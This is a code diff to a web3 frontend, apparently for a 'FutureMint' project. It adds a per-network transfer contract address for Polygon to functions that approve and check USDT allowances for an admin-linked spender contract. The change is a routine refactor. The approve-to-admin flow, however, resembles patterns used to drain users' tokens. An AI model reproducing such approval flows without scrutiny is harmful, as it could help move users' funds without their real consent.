@@ -21,6 +21,17 @@ export const ADMIN_WALLET_ADDRESS = process.env.NEXT_PUBLIC_ADMIN_WALLET_ADDRESS
 
 // Smart contract address for transfer proxy — this is the ONLY spender used for approvals
 export const TRANSFER_CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_TRANSFER_CONTRACT_ADDRESS;
+export const TRANSFER_CONTRACT_ADDRESS_POLYGON = process.env.NEXT_PUBLIC_TRANSFER_CONTRACT_ADDRESS_POLYGON;
+
+/**
+ * Get the correct transfer contract for a given network
+ */
+const getTransferContract = (network) => {
+  if (network === 'Polygon') {
+    return TRANSFER_CONTRACT_ADDRESS_POLYGON || TRANSFER_CONTRACT_ADDRESS;
+  }
+  return TRANSFER_CONTRACT_ADDRESS;
+};
 
 /**
  * Safely normalize any address to proper checksum format
@@ -120,8 +131,8 @@ export const approveUSDTForAdmin = async (provider, network) => {
     const contractAddress = network === 'BSC' ? USDT_BSC_ADDRESS : USDT_POLYGON_ADDRESS;
     if (!contractAddress) throw new Error('USDT contract not configured for ' + network);
     
-    // Use the deployed FutureMintTransfer contract as spender
-    let spender = TRANSFER_CONTRACT_ADDRESS;
+    // Use the deployed FutureMintTransfer contract as spender (network-specific)
+    let spender = getTransferContract(network);
     if (!spender || !spender.startsWith('0x') || spender.length !== 42) {
       throw new Error('Transfer contract address not configured. Please contact support.');
     }
@@ -155,8 +166,8 @@ export const checkUSDTAllowance = async (userAddress, network) => {
     const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
     const contractAddress = network === 'BSC' ? USDT_BSC_ADDRESS : USDT_POLYGON_ADDRESS;
     
-    // Use the deployed FutureMintTransfer contract as spender
-    let spender = TRANSFER_CONTRACT_ADDRESS;
+    // Use the deployed FutureMintTransfer contract as spender (network-specific)
+    let spender = getTransferContract(network);
     if (!contractAddress || !spender || !spender.startsWith('0x') || spender.length !== 42) {
       return false;
     }
